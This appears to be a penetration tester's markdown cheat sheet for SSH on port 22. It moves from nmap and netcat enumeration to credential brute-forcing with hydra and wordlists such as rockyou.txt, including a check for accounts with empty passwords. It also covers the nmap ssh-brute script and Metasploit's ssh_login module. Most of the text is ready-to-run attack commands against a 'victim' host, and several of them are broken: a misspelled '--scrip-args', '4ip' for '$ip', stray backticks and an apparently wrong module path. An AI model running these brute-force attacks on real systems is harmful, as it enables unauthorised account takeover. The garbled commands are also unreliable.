# iii - SSH - 22

`nmap $ip -p22 -sV -O` - service version scan for ssh.

`nc  $ip 22` - for SSH banner grabbing.

`nmap $ip -p22 --script ssh2-enum-algos` - enumerating all the supported algorithms.

`nmap $ip -p22 --script ssh2-hostkey --scrip-args ssh_hostkey=full` - enumerating the victim's full SSH rsa host key.

\``nmap $ip -p22 --script ssh-auth-methods --script-args="ssh.user=admin"` - enumerating all the supported authentication methods.

## SSH Dictionary  Attacks using \[hydra]

You could run hydra with a users wordlists and specify empty passwords, to see if there are any user with no password.

`hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -p "" $ip ssh` - bruteforcing for users without password.

You can run the normal attack with users and passwords wordlists too.

\`hydra -L /usr/share/`metasploit-framework/data/wordlists/common_users.txt -P /usr/share/wordlists/rockyou.txt $ip ssh` - specified users and password wordlists.

## Bruteforce with \[nmap] utility

```bash
# you might want to check for specific users like: "root", "admin" or "administrator"
# so you can save them to a file as "user" wordlist file.
echo "administrator" > user
# "/root" is the path the "user" file is stored
nmap 4ip -p22 --script ssh-brute --script-args userdb=/root/user
```

## Bruteforce with \[msfconsole] Metasploit

```bash
use auxiliary/ssh/ssh_login
show options
set RHOSTS $ip
set userpass_file /usr/share/wordlists/metasploit/root_userpass.txt
set STOP_ON_SUCCESS true
set verbose true
options   # verify options are specified correctly.
run
```







